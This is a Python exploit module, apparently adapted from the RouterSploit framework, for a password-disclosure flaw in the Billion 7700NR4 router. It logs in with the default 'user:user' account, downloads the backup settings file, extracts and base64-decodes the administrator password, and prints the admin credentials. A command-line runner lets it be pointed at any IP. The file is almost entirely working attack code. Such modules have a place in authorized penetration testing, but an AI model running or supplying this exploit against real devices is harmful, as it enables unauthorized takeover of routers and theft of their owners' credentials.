target = ""
# rsf exploit module
# description: Exploits Billion 7700NR4 password disclosure vulnerability that allows fetching credentials.

import re
import base64
from http.client import HTTPConnection


class Exploit:
    __info__ = {
        "name": "Billion 7700NR4 Password Disclosure",
        "description": "Exploits Billion 7700NR4 password disclosure vulnerability.",
        "authors": (
            "R-73eN",
            "Marcin Bury <marcin[at]threat9.com>",
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40472/",
        ),
        "devices": (
            "Billion 7700NR4",
        ),
    }

    def_user = "user"
    def_pass = "user"
    target = ""
    port = 80

    def run(self):
        creds = []
        conn = HTTPConnection(self.target, self.port)
        conn.request("GET", "/backupsettings.conf", headers={'Authorization': f"Basic {base64.b64encode(f'{self.def_user}:{self.def_pass}'.encode()).decode()}"})
        response = conn.getresponse()

        if response.status != 200:
            print("Exploit failed")
            return

        res = re.findall('<AdminPassword>(.+?)</AdminPassword>', response.read().decode())

        if res:
            print("Found strings: {}".format(res[0]))

            try:
                print("Trying to base64 decode")
                password = base64.b64decode(res[0]).decode()
                creds.append(("admin", password))
                print("Credentials found!")
                print("Login: admin, Password: {}".format(password))
            except Exception:
                print("Exploit failed - could not decode password")
        else:
            print("Credentials could not be found")

    def check(self):
        conn = HTTPConnection(self.target, self.port)
        conn.request("GET", "/backupsettings.conf", headers={'Authorization': f"Basic {base64.b64encode(f'{self.def_user}:{self.def_pass}'.encode()).decode()}"})
        response = conn.getresponse()

        if response.status != 200:
            return False

        res = re.findall('<AdminPassword>(.+?)</AdminPassword>', response.read().decode())

        if res:
            return True

        return False




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
